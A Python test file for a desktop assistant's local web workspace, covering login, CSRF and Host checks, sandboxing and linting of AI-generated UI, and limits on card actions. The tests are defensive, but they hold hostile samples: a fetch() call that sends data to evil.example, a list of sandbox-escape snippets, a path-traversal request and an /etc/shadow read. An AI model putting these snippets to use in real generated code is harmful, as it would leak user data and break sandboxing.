"""Living Workspace (Test I and the UI parts of Test K): loopback HTTP server, one-time login,
CSRF/Origin/Host checks, the AG-UI event stream, generated-UI linting and sandbox headers, card
actions (declared only, rate-limited, never an approval) and data provenance on visual cards."""

from __future__ import annotations

import asyncio
import json

import httpx
import pytest

from jarvis import config as configmod
from jarvis.capabilities import visual

GOOD_UI = {"title": "Loan calculator", "summary": "Monthly payment for a loan.",
           "css": ".row{display:flex;gap:8px}",
           "html": "<label>Amount <input id='a' type='number' value='100000'></label><output id='o' role='status'></output>",
           "js": "const a=document.getElementById('a');const o=document.getElementById('o');"
                 "function upd(){const v=a.valueAsNumber;o.textContent=Number.isFinite(v)?Jarvis.fmt.number(v/12,2):'—';}"
                 "a.addEventListener('input',upd);upd();"}


class FakeBrain:
    gemini_key = None
    claude_key = "x"
    provider = "claude"
    failures: dict = {}

    def __init__(self):
        self.json_replies = []

    async def complete(self, prompt, system="", *, schema=None, **kw):
        return self.json_replies.pop(0)


@pytest.fixture
def jarvis(tmp_path, monkeypatch, fake):
    monkeypatch.setenv("JARVIS_NO_VOICE", "1")
    monkeypatch.setattr(configmod, "data_dir", lambda: tmp_path / "data")
    monkeypatch.setattr(configmod, "config_dir", lambda: tmp_path / "cfg")
    from jarvis import daemon
    cfg = configmod.Config(path=tmp_path / "cfg" / "config.toml")
    cfg.values["files"]["roots"] = [str(tmp_path)]
    j = daemon.Jarvis(cfg)
    j.platform = j.ctx.platform = fake
    j.brain = j.ctx.brain = FakeBrain()
    j.workspace._launch = lambda url: j.workspace.__dict__.setdefault("launched", []).append(url) or "test"
    return j


async def login(j) -> httpx.AsyncClient:
    await j.workspace.ensure_started()
    url = j.workspace.login_url()
    client = httpx.AsyncClient(base_url=j.workspace.origin, follow_redirects=False, timeout=10)
    r = await client.get(url.removeprefix(j.workspace.origin))
    assert r.status_code == 302 and "HttpOnly" in r.headers["set-cookie"] and "SameSite=Strict" in r.headers["set-cookie"]
    client.cookies.set("jw_session", r.cookies["jw_session"])
    return client


def test_login_code_is_single_use_and_pages_need_a_session(jarvis):
    async def main():
        await jarvis.workspace.ensure_started()
        url = jarvis.workspace.login_url()
        async with httpx.AsyncClient(base_url=jarvis.workspace.origin, follow_redirects=False) as c:
            assert (await c.get("/")).status_code == 401
            assert (await c.get("/api/state")).status_code == 401
            path = url.removeprefix(jarvis.workspace.origin)
            assert (await c.get(path)).status_code == 302
            assert (await c.get(path)).status_code == 401              # replayed link: refused
            assert (await c.get("/api/state", headers={"Host": "evil.example"})).status_code == 403   # DNS rebinding
        await jarvis.workspace.stop()
    asyncio.run(main())


def test_writes_need_csrf_same_origin_and_json(jarvis):
    async def main():
        c = await login(jarvis)
        state = (await c.get("/api/state")).json()
        assert state["csrf"] and "tasks" in state and state["approval_timeout_s"] == 120
        page = await c.get("/")
        assert page.status_code == 200 and "script-src 'self'" in page.headers["content-security-policy"]
        assert (await c.post("/api/ask", json={"text": "hi"})).status_code == 403                       # no token
        h = {"X-Jarvis-CSRF": state["csrf"]}
        assert (await c.post("/api/ask", json={"text": "hi"}, headers={**h, "Origin": "http://evil.example"})).status_code == 403
        assert (await c.post("/api/ask", content=b"text=hi", headers={**h, "Content-Type": "application/x-www-form-urlencoded"})).status_code == 400
        r = await c.post("/api/cancel", json={}, headers=h)
        assert r.status_code == 200 and r.json()["ok"]
        assert (await c.get("/static/../../daemon.py")).status_code == 404
        assert (await c.get("/api/file", params={"path": str(configmod.data_dir() / "memory.db")})).status_code == 404
        await c.aclose()
        await jarvis.workspace.stop()
    asyncio.run(main())


def test_event_stream_is_ag_ui(jarvis):
    async def main():
        c = await login(jarvis)
        frames = []

        async def read():
            async with c.stream("GET", "/api/events") as r:
                assert r.headers["content-type"].startswith("text/event-stream")
                async for line in r.aiter_lines():
                    if line.startswith("data: "):
                        frames.append(json.loads(line[6:]))
                    if len(frames) >= 8:
                        return
        reader = asyncio.create_task(read())
        await asyncio.sleep(0.3)
        jarvis.hub.card("chart", {"type": "bar", "labels": ["a"], "series": [{"name": "x", "values": [1]}]}, "Chart")

        async def work(task):
            jarvis.tasks.step(task, "tool", "office(action='latest')", tool="office")
            jarvis.tasks.step(task, "result", "Newest: budget.xlsx", tool="office", ok=True)
            return "done"
        jarvis.tasks.start("find the budget", "text", work)
        jarvis.bus.publish("reply", text="Found it.", task_id=None)
        await asyncio.wait_for(reader, 10)
        types = [f["type"] for f in frames]
        assert types[:2] == ["STATE_SNAPSHOT", "MESSAGES_SNAPSHOT"]
        assert "ACTIVITY_SNAPSHOT" in types and "RUN_STARTED" in types
        assert {"TOOL_CALL_START", "TOOL_CALL_RESULT"} & set(types) or "CUSTOM" in types
        act = next(f for f in frames if f["type"] == "ACTIVITY_SNAPSHOT")
        assert act["activityType"] == "jarvis.chart" and act["content"]["title"] == "Chart"
        await c.aclose()
        await jarvis.workspace.stop()
    asyncio.run(main())


def test_generated_ui_is_linted_sandboxed_and_served_with_a_strict_csp(jarvis):
    async def main():
        bad = {**GOOD_UI, "js": "fetch('https://evil.example/?d='+JSON.stringify(Jarvis.data))"}
        jarvis.brain.json_replies = [bad, dict(GOOD_UI)]
        task = jarvis.tasks.start("ui", "text", lambda t: jarvis.run_tool(t, "generate_ui", {
            "request": "loan calculator", "data": {"rate": 5}}))
        await task.handle
        card = jarvis.hub.cards[-1]
        assert card["kind"] == "generated" and card["id"] in jarvis.workspace.generated
        assert jarvis.workspace.launched                                   # the workspace opened
        c = await login(jarvis)
        doc = await c.get(f"/sandbox/{card['id']}")
        csp = doc.headers["content-security-policy"]
        assert "connect-src 'none'" in csp and "form-action 'none'" in csp and "default-src 'none'" in csp
        assert "sandbox-runtime.js" in doc.text and "Jarvis.ready" in doc.text and "fetch(" not in doc.text
        state = (await c.get("/api/state")).json()
        pub = next(x for x in state["cards"] if x["id"] == card["id"])
        assert pub["generated"]["actions"] == ["ask"]
        await c.aclose()
        await jarvis.workspace.stop()
        # Two forbidden answers in a row: refused, nothing served.
        jarvis.brain.json_replies = [bad, bad]
        task = jarvis.tasks.start("ui", "text", lambda t: jarvis.run_tool(t, "generate_ui", {"request": "x"}))
        await task.handle
        assert "safe interface" in task.result["message"]
    asyncio.run(main())


@pytest.mark.parametrize("code", [
    "fetch('/api/state')", "new XMLHttpRequest()", "location.href='https://x'", "window.open('https://x')",
    "document.cookie", "localStorage.setItem('a',1)", "eval('1')", "new Function('return 1')",
    "import('https://esm.sh/x')", "parent.postMessage('x','*')", "top.location", "<iframe src=x>",
    "<form action='https://x'>", "<meta http-equiv=refresh>", "navigator.sendBeacon('/x')", "new WebSocket('ws://x')",
])
def test_lint_rejects_escape_hatches(code):
    assert visual.lint(code)


def test_lint_accepts_ordinary_widget_code():
    assert visual.lint(GOOD_UI["css"], GOOD_UI["html"], GOOD_UI["js"]) == []
    assert visual.lint("const svg=document.createElementNS('http://www.w3.org/2000/svg','svg')") == []


def test_card_actions_are_declared_rate_limited_and_never_approve(jarvis, tmp_path):
    async def main():
        c = await login(jarvis)
        h = {"X-Jarvis-CSRF": (await c.get("/api/state")).json()["csrf"]}
        report = tmp_path / "r.pdf"
        report.write_bytes(b"%PDF")
        jarvis.hub.card("document", {"path": str(report), "actions": ["open_path"]}, "Report", card_id="d1")
        r = await c.post("/api/ui-action", json={"card_id": "d1", "action": "ask", "payload": {"text": "x"}}, headers=h)
        assert r.status_code == 403                                         # not declared by this card
        r = await c.post("/api/ui-action", json={"card_id": "d1", "action": "open_path",
                                                 "payload": {"path": "/etc/shadow"}}, headers=h)
        assert r.status_code == 403                                         # only the card's own file
        r = await c.post("/api/ui-action", json={"card_id": "d1", "action": "open_path",
                                                 "payload": {"path": str(report)}}, headers=h)
        assert r.status_code == 200 and r.json()["ok"]
        # A pending approval and a card that sends "yes": it becomes a request, not an answer.
        jarvis.hub.card("generated", {"actions": ["ask"]}, "Widget", card_id="g1")
        jarvis.workspace.add_generated("g1", css="", html="", js="", data={}, actions=["ask"], title="Widget")

        async def risky(task):
            return await jarvis.run_tool(task, "close_window", {})
        t = jarvis.tasks.start("close", "text", risky)
        for _ in range(100):
            if jarvis.tasks.approvals:
                break
            await asyncio.sleep(0.02)
        r = await c.post("/api/ui-action", json={"card_id": "g1", "action": "ask", "payload": {"text": "yes"}}, headers=h)
        assert r.status_code == 200 and jarvis.tasks.approvals                # still pending
        codes = [(await c.post("/api/ui-action", json={"card_id": "g1", "action": "ask", "payload": {"text": f"q{i}"}},
                               headers=h)).status_code for i in range(14)]
        assert 429 in codes
        jarvis.tasks.cancel()
        await asyncio.sleep(0.05)
        await c.aclose()
        await jarvis.workspace.stop()
        t.handle.cancel()
    asyncio.run(main())


def test_show_labels_numbers_by_what_tools_returned(jarvis):
    async def main():
        jarvis._evidence.append((__import__("time").time(), json.dumps({"changes": [
            {"label": "Flooring", "before": 18000, "after": 20160}, {"label": "Total", "before": 169500, "after": 171660}]})))
        ok = {"items": [{"label": "Flooring", "before": 18000, "after": 20160}, {"label": "Total", "before": 169500, "after": 171660}]}
        made_up = {"items": [{"label": "Flooring", "before": 18000, "after": 25500}]}

        async def show(data, **extra):
            holder = {}

            async def work(task):
                holder["r"] = await jarvis.run_tool(task, "show", {"kind": "comparison", "data": data, **extra})
                return "x"
            await jarvis.tasks.start("show", "text", work).handle
            return holder["r"], jarvis.hub.cards[-1]["provenance"]
        r, prov = await show(ok)
        assert prov["kind"] == "verified" and prov["verified"]
        r, prov = await show(made_up)
        assert prov["kind"] == "unverified" and "UNVERIFIED" in r["message"]
        r, prov = await show(made_up, illustrative=True)
        assert prov["kind"] == "illustrative"
    asyncio.run(main())
